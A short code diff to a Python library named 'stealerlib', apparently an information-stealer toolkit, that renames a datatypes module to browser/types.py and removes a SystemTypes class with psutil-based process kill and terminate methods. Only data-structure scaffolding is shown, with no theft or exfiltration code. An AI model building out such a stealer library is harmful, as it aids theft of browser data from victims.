@@ -2,14 +2,11 @@
 # -*- coding: utf-8 -*-
 """
     @author:  codeuk
-    @package: stealerlib/datatypes.py
+    @package: stealerlib/browser/types.py
 """
 
-import psutil
 
 from dataclasses import dataclass
-
-from stealerlib.exceptions import catch
 
 
 class BrowserTypes:
@@ -75,33 +72,3 @@ class BrowserTypes:
                 self.number,
                 self.date_modified
             ]
-
-
-class SystemTypes:
-
-    @dataclass
-    class Process:
-        pid: int
-        name: str
-        status: str
-        parent: list[psutil.Process]
-        children: list[psutil.Process]
-
-        def conv(self) -> list:
-            return [
-                self.pid,
-                self.name,
-                self.status,
-                self.parent,
-                self.children
-            ]
-
-        @catch
-        def kill(self):
-            p = psutil.Process(self.pid)
-            p.kill()
-
-        @catch
-        def terminate(self):
-            p = psutil.Process(self.pid)
-            p.terminate()
